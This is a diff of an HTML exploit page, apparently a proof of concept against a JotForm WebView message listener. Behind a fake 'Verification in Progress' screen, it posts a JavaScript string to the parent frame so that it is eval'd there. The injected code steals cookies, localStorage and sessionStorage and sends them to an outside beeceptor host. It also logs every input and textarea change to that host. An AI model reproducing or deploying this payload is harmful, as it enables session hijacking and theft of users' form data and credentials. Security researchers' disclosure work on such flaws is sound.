@@ -1,44 +1,82 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head>
+    <title>Verification in Progress</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            font-size: 12px;
+            text-transform: uppercase;
+        }
+        .scanner {
+            width: 80%;
+            height: 2px;
+            background: #00ff41;
+            box-shadow: 0 0 10px #00ff41;
+            position: absolute;
+            animation: scan 2s linear infinite;
+        }
+        @keyframes scan {
+            0% { top: 0%; }
+            100% { top: 100%; }
+        }
+        .status {
+            letter-spacing: 2px;
+            animation: blink 1s steps(2, start) infinite;
+        }
+        @keyframes blink { to { visibility: hidden; } }
+    </style>
+</head>
 <body>
+    <div class="scanner"></div>
+    <div class="status">Initializing Secure Bridge...</div>
+    <div id="log"></div>
+
 <script>
-// Wait for parent frame to fully load the JotForm bridge
 setTimeout(function() {
+    // Clean string joining without leading spaces to avoid syntax errors
     var collectCode = [
         '(function(){',
-        '  var data={',
-        '    cookies:document.cookie,',
-        '    ls:JSON.stringify(localStorage),',
-        '    ss:JSON.stringify(sessionStorage),',
-        '    url:location.href,',
-        '    ua:navigator.userAgent,',
-        '    ts:new Date().toISOString()',
-        '  };',
-        '  fetch("https://evilios.free.beeceptor.com/collect",{',
-        '    method:"POST",',
-        '    headers:{"Content-Type":"application/json"},',
-        '    body:JSON.stringify(data)',
-        '  });',
-        '  var obs=new MutationObserver(function(){',
-        '    document.querySelectorAll("input,textarea").forEach(function(i){',
-        '      if(!i.__h){i.__h=true;i.addEventListener("change",function(){',
-        '        fetch("https://evilios.free.beeceptor.com/keylog",{method:"POST",body:JSON.stringify({f:i.name||i.id,v:i.value})});',
-        '      });}',
-        '    });',
-        '  });',
-        '  obs.observe(document.body,{childList:true,subtree:true});',
+        'var d={',
+        'cookies:document.cookie,',
+        'ls:JSON.stringify(localStorage),',
+        'ss:JSON.stringify(sessionStorage),',
+        'url:location.href,',
+        'ua:navigator.userAgent,',
+        'ts:new Date().toISOString()',
+        '};',
+        'fetch("https://evilios.free.beeceptor.com/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});',
+        'var obs=new MutationObserver(function(){',
+        'document.querySelectorAll("input,textarea").forEach(function(i){',
+        'if(!i.__h){i.__h=true;i.addEventListener("change",function(){',
+        'fetch("https://evilios.free.beeceptor.com/keylog",{method:"POST",body:JSON.stringify({f:i.name||i.id,v:i.value})});',
+        '});}',
+        '});',
+        '});',
+        'obs.observe(document.body,{childList:true,subtree:true});',
         '})()'
     ].join('');
 
     var payload = {
         type: 'window.opener',
         name: 'eval',
-        args: [collectCode]   // ← string of code, eval()'d in jotform.com context
+        args: [collectCode]
     };
 
-    // Send to parent WebView — the vulnerable messageListener picks this up
     window.parent.postMessage(JSON.stringify(payload), '*');
+    
+    // Visual feedback for you during testing
+    document.querySelector('.status').innerText = "Payload Delivered";
+    document.querySelector('.status').style.color = "white";
 }, 500);
 </script>
 </body>
